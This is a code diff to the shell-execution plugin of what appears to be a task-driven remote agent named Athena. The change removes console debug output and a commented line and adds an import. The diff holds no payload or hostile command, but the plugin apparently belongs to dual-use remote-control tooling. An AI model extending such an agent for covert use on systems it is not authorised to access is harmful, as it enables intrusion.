@@ -1,4 +1,5 @@
-﻿using Athena.Plugins;
+﻿using Athena.Models;
+using Athena.Plugins;
 using System;
 using System.Collections.Concurrent;
 using System.Collections.Generic;
@@ -13,14 +14,12 @@ namespace Plugins
         Dictionary<string, Process> runningProcs = new Dictionary<string, Process>();
         public override void Execute(Dictionary<string, string> args)
         {
-            Console.WriteLine("in shell execute.");
             try
             {
                 PluginHandler.AddResponse(ShellExec(args));
             }
             catch (Exception e)
             {
-                Console.WriteLine(e);
                 //oh no an error
                 PluginHandler.Write(e.ToString(), args["task-id"], true, "error");
             }
@@ -106,7 +105,6 @@ namespace Plugins
             {
                 return new ResponseResult()
                 {
-                    //user_output = process.StandardOutput.ReadToEnd() + Environment.NewLine + process.StandardError.ReadToEnd() + Environment.NewLine + e.Message,
                     user_output = Environment.NewLine + e.ToString(),
                     task_id = args["task-id"],
                     completed = "true",
